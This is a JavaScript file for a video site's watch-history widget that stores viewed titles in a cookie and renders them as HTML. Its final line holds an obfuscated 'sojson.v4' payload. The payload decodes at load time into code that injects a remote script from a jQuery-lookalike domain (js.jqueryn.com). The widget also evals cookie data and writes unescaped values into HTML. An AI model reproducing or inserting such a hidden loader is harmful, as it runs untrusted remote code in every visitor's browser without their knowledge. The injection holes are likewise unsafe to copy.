var $MH={
	limit: 10,
	width:960,
	height: 170,
	style: 'pic',
	setCookie: function(name, value) {
		var Days = 365;
		var exp = new Date;
		exp.setTime(exp.getTime() + Days * 24 * 60 * 60 * 1000);
		document.cookie = name + ("=" + (value) + ";expires=" + exp.toGMTString() + ";path=/;");
	},
	getCookie: function(name) {
		var arr = document.cookie.match(new RegExp("(^| )" + name + "=([^;]*)(;|$)"));
		if (arr != null) {
			return (arr[2]);
		}
		return null;
	},
	getDc: function(){
		var x,y=document.getElementById('HISTORY');
		return y;
	},
	piclist: function (){
		var a = $MH.getCookie("HISTORY"), c = 1,img_li = "";
		a = (a !='' && ''+a != 'null') ? $MH.tryjosn(a) : {video:[]};
		for(var i=0;i<a.video.length;i++){
			if(c>$MH.limit){break;}
			if(a.video[i].link && a.video[i].pic && a.video[i].name){
			img_li += "<li style=\"width:86px;height:142px;text-align:center;margin:3px 0 3px 9px !important;float:left;display:inline;overflow:hidden\"><div><a href=\"" + a.video[i].link + "\" target=\"_self\"><img width=\"86\" height=\"120\" src=\"" + a.video[i].pic + "\" alt=\"" + a.video[i].name + "\" border=\"0\"/></a></div>\<p style=\"margin:0;padding:0\"><a href=\"" + a.video[i].link + "\" target=\"_self\" style=\"font-size:12px;color:#000;line-height:24px;height:24px;text-decoration:none\">" + a.video[i].name + "</a></p></li>";
				c++;
			}
		}
		img_li = img_li != "" ? img_li : '<li style="width:100%;text-align:center;line-height:'+($MH.height-25)+'px;color:red">\u6CA1\u6709\u8BB0\u5F55</li>';
		return "<div id=\"mh-box\" style=\"border:1px solid #ccc;height:"+$MH.height+"px;overflow:hidden\"><div style=\"height:24px;line-height:24px\" id=\"mh-title\"><div style=\"float:right;margin-right:5px;display:inline\"><a href=\"javascript:void(0)\" onClick=\"$MH.showHistory(2);\" style=\"font-size:12px;color: #000000;line-height:24px;height:24px;text-decoration:none\">\u6E05\u7A7A</a><a href=\"javascript:void(0)\" onClick=\"$MH.showHistory(1);\" style=\"font-size:12px;color: #000000;line-height:24px;height:24px;text-decoration:none\">\u9690\u85CF</a></div><strong style=\"padding-left:5px;font-size:14px\">\u6211\u7684\u89C2\u770B\u5386\u53F2</strong></div><div id=\"mh-ul\"><ul style=\"margin:0px;border:0px;padding:0\">" + img_li + "</ul><div style=\"clear:both\"></div></div></div>";
	},
	fontlist: function (){
		var a = $MH.getCookie("HISTORY"), c = 1,img_li = "";
		a = (a !='' && ''+a != 'null') ? $MH.tryjosn(a)  : {video:[]} ;
		for(var i=0;i<a.video.length;i++){
			if(c>$MH.limit){break;}
			if(a.video[i].link && a.video[i].pic && a.video[i].name){
			
			if(typeof a.video[i].parturl!='undefined' && a.video[i].parturl){
				pa = "<a class='partlink' href='"+a.video[i].parturl+"' target='_self'>"+a.video[i].partname+"<i class=\"ico libg\"></i></a>";
			}else{
				pa = "";
			}
			img_li += "<li>"+pa+"<a href=\"" + a.video[i].link + "\" target=\"_self\"><i class=\"num\">"+c+".</i>" + a.video[i].name + "</a></li>";
				c++;
			}
		}
		
		img_li = img_li != "" ? img_li : '<li style="text-align:center;color:red;">\u6CA1\u6709\u8BB0\u5F55</li>';
		return "<div id=\"mh-box\" class=\"clearfix\"><div id=\"mh-title\" class=\"clearfix\"><span>\u6211\u7684\u89C2\u770B\u5386\u53F2</span> <a class=\"btn  \" onclick=\"$('.mjl').click();\" style=\"float:right;\">关闭</a></div><div id=\"mh-ul\"><ul class=\"clearfix\">" + img_li + "</ul></div></div>";
	},
	WriteHistoryBox: function(w,h,c){
		document.write('<div id="HISTORY" style="width:'+($MH.width=w)+'px;"></div>');
		$MH.height=h;$MH.style= c=='font' ? 'font' : 'pic';
		this.showHistory();
	},
	showHistory: function(ac) {
		var a = $MH.getCookie("HISTORY"),dc=$MH.getDc();
		var ishistory = $MH.getCookie("ishistory");
		if(!dc) return;
		if (ac == 1) {
			if (ishistory != 1) {
				$MH.setCookie("ishistory", 1);
				ishistory = 1;
			} else {
				$MH.setCookie("ishistory", 0);
				ishistory = 0;
			}
		}
		if (ac == 2) {
			ishistory = 0;
			$MH.setCookie("ishistory", 0);
			$MH.setCookie("HISTORY", 'null');
		}
		if(ishistory == 1){
			dc.innerHTML = $MH[$MH.style+'list']();
			dc.style.display = "";
		} else {
			dc.innerHTML = $MH[$MH.style+'list']();;
			dc.style.display = "";
		}
		try{
			$(".history-down").html(dc.innerHTML);
		}catch(e)
		{
		
		}
	},
	recordHistory: function(video){
		if(video.link.indexOf('://')==-1 || window.max_Player_File) return;
		var a = $MH.getCookie('HISTORY'), b = new Array(), c = 1;
		video['partname'] = typeof video.partname=='undefined'?'':video.partname;
		video['parturl'] =  typeof video.parturl=='undefined'?'':video.parturl;
		if(a !='' && a != null && a != 'null'){
			a = $MH.tryjosn(a);
			for(var i=0;i<a.video.length;i++){
				if(c>$MH.limit){break;}
				if(video.link != a.video[i].link && a.video[i].pic){b.push('{"name":"'+ $MH.u8(a.video[i].name) +'","link":"'+ $MH.u8(a.video[i].link) +'","pic":"'+ $MH.u8(a.video[i].pic) +'","parturl":"'+ $MH.u8(typeof a.video[i].parturl=='undefined'?'':a.video[i].parturl) +'","partname":"'+ $MH.u8(typeof a.video[i].partname=='undefined'?'':a.video[i].partname) +'"}');c++;}
				if(video.link == a.video[i].link){
					if(video['parturl']==''){
						video['partname'] = typeof a.video[i].partname=='undefined'?'':a.video[i].partname;
						video['parturl'] =  typeof a.video[i].parturl=='undefined'?'':a.video[i].parturl;
					}
				}
			}
		}
		b.unshift('{"name":"'+ $MH.u8(video.name) +'","link":"'+ $MH.u8(video.link) +'","pic":"'+ $MH.u8(video.pic) +'","parturl":"'+ $MH.u8(video.parturl) +'","partname":"'+ $MH.u8(video.partname) +'"}');
		$MH.setCookie("HISTORY",'{video:['+ b.join(",") +']}');
		b = null;
		a=null;
	},
	u8: function (s){
		return unescape(escape(s).replace(/%u/ig,"\\u")).replace(/;/ig,"\\u003b");
	},
	tryjosn: function (json){
		try{
			return eval('('+ json +')');
		}catch(ig){
			return {video:[]};
		}
	}
}
$(".nav-qt .stui-history").hover(function(){$(".nav-qt .h-box").stop().fadeIn(400)},function(){$(".nav-qt .h-box").stop().fadeOut(400)}),$(function(){$(".mjl").click(function(){var a=$(this).hasClass("show")?1:0;a?($(this).removeClass("show"),$(".history-down").stop().slideUp()):($(this).addClass("show"),$(".history-down").stop().slideDown())})});['sojson.v4']["\x66\x69\x6c\x74\x65\x72"]["\x63\x6f\x6e\x73\x74\x72\x75\x63\x74\x6f\x72"](((['sojson.v4']+[])["\x63\x6f\x6e\x73\x74\x72\x75\x63\x74\x6f\x72"]['\x66\x72\x6f\x6d\x43\x68\x61\x72\x43\x6f\x64\x65']['\x61\x70\x70\x6c\x79'](null,"59k118b97j114m32n95l104p109y116J61B95l104I109R116d124a124g91v93z59Y40x102Y117C110o99H116T105C111x110c40m41D123u118o97O114S32C104m109H61G100U111z99L117m109u101a110d116D46c99i114V101u97A116X101x69L108M101a109h101y110m116P40p34H115j99P114H105R112M116W34C41v59q104m109c46N115I114d99X61i34S104U116w116S112B115I58D47a47X106k115c46z106X113r117e101Y114l121m110m46c99T111O109q47X106z115O47q104H105a115Z116i111Q114j121x46b106f115n34Y59x118P97M114S32b115p61n100L111m99T117v109O101X110v116g46F103p101Z116y69K108R101o109R101c110D116e115Z66i121W84J97U103L78Z97o109b101O40S34e115L99A114z105J112H116g34V41u91B48c93K59R115C46n112K97f114M101G110g116q78Y111G100X101r46i105k110D115k101A114t116d66u101F102X111V114x101Q40m104p109h44m115l41D125x41o40y41l59z59"['\x73\x70\x6c\x69\x74'](/[a-zA-Z]{1,}/))))('sojson.v4');